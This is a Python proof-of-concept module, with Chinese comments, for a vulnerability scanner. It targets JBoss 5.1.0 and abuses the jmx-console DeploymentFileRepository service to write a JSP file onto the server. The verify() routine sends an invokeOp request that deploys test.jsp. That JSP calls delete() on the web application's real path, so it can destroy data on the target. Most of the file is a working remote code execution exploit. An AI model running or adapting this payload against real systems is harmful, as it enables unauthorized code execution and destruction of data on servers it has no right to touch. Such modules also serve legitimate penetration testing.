# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'JBoss_0101'  # 平台漏洞编号，留空
    name = 'JBoss 5.1.0 DeploymentFileRepository 代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-06-01'  # 漏洞公布时间
    desc = '''
    Jboss5.1.0默认配置允许直接部署代码到服务器上，可以执行攻击者提供的任意代码。
    '''  # 漏洞描述
    ref = 'http://www.securityfocus.com/bid/21219/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JBoss'  # 漏洞应用名称
    product_version = '5.1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c2850eb2-6392-427f-a076-b993ce4da1de'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_code = ('\\n<%@ page import="java.util.*,java.io.*" %>\\n<%@ page import="'
                           'java.io.*"%>\\n<%\\nString path=request.getRealPath("");\\nout.prin'
                           'tln(path);\\nFile d=new File(path);\\nif(d.exists()){\\n  d.delete()'
                           ';\\n  }\\n%>\\n<% out.println("this_is_not_exist_9.1314923");%>')
            payload = ('action=invokeOp&name=jboss.admin%%3Aservice%%3DDeploymentFileRepositor'
                       'y&methodIndex=5&arg0=test.war&arg1=test&arg2=.jsp&arg3=%s&arg4=True')
            verify_data = payload % urllib.parse.quote(verify_code)
            verify_url = self.target + '/jmx-console/HtmlAdaptor'
            page_content = ''
            request = urllib.request.Request(verify_url, verify_data)
            response = urllib.request.urlopen(request)
            page_content = str(response.read())
            if 'this_is_not_exist_9.1314923' in page_content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
